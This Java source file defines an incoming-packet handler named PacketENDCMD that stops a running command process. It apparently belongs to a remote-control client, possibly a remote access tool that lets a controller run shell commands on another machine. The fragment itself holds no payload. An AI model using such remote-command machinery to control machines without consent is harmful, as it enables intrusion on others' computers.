package com.redpois0n.packets.in;

import com.redpois0n.CMD;

public class PacketENDCMD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (CMD.p != null) {
			CMD.p.destroy();
		}
	}

}
